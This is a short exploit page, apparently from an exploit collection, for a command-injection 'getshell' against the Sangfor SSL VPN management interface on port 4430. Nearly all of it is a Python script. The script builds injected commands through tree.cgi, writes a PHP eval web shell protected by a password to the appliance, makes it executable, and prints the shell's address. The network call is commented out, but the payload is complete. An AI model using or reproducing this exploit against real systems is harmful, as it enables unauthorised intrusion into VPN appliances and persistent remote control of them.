# 深信服SSL VPN 4430 管理端口getshell



## EXP

```
from urllib.parse import quote
import urllib.request
import ssl


def cmdinject(ip,cmd):
    cmd = cmd.replace(' ','${IFS}')
    url = f"https://{ip}/cgi-bin/tree.cgi?a=';{cmd};'a"
    print(url)
    context = ssl._create_unverified_context()
    #request = urllib.request.urlopen(url=url,context=context)



def GetRootShell(target_ip):
    cmd = "echo -n -e '<?php\\neval($_POST[444]);?>'>/etc/db/svpnrcico/TEST.php"
    cmdinject(target_ip,cmd)
    cmd = "chmod 755 /etc/db/svpnrcico/TEST.php"
    cmdinject(target_ip,cmd)
    print("shell : https://"+target_ip.replace('4430','443')+':4430/com/svpnrcico/TEST.php pass:444')


target_ip = 'x.x.x.x:4430'

GetRootShell(target_ip)
```

